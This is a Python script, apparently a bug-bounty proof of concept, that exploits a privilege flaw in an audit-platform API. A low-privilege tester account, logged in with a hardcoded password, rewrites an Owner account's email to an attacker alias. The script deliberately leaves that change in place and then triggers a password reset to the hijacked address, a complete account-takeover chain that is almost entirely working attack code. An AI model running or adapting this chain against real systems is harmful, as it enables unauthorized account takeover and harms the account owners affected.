import json,subprocess,os
H=os.environ['H']; BB=os.environ['BB']
ATTACKER="zeno0@bugcrowdninja.com"
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or ''),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
def login(email,pw):
    cmd=['curl','-s','-m','30','-o','/tmp/l','-w','%{http_code}','-X','POST',H+'/api/v1/users/login',
         '-H',BB,'-H','Content-Type: application/json','-d',json.dumps({"credentials":{"email":email,"password":pw}})]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/l',encoding='utf-8',errors='replace').read()

print("=== STEP 0: Tester (role 4) logs in ===")
c,b=login("tester@soxhub.com","Zx9!lower47")
print(f"  login -> {c}")
if c!='200':
    print("  ",b[:200]); raise SystemExit(1)
s=json.loads(b)['session']; TT=s['token']
open('/tmp/tok_Tester','w').write(TT)
print(f"  id={s['id']} role={s['role_id']} email={s['email']}")

print("\n=== STEP 1: baseline victim 230 ===")
c,b=req('GET','/api/v1/users/230',tok=TT)
u=json.loads(b)['users'][0]
ORIG=u['email']
print(f"  id=230 email={ORIG!r} role={u['role_id']}")
open('/tmp/victim_orig_email','w').write(ORIG)

print("\n=== STEP 2: Tester hijacks Owner 230's email -> attacker alias (NOT reverted) ===")
c,b=req('PUT','/api/v1/users/230',{"user":{"email":ATTACKER}},tok=TT)
print(f"  PUT -> {c}")
c,b=req('GET','/api/v1/users/230',tok=TT)
NOW=json.loads(b)['users'][0]['email']
print(f"  read-back -> {NOW!r}")
print(f"  {'*** HIJACK LANDED — LEFT IN PLACE ***' if NOW==ATTACKER else 'FAILED'}")

print("\n=== STEP 3: does the victim's existing session survive? ===")
TB=open('/tmp/tok_B-230').read().strip() if os.path.exists('/tmp/tok_B-230') else ''
if TB:
    c,b=req('GET','/api/v1/users/me',tok=TB)
    print(f"  victim old token -> {c}")

print("\n=== STEP 4: trigger password reset to the hijacked address ===")
c,b=req('POST','/api/v1/users/password-reset-email',{"email":ATTACKER})
print(f"  password-reset-email -> {c} {b[:120].replace(chr(10),' ')}")
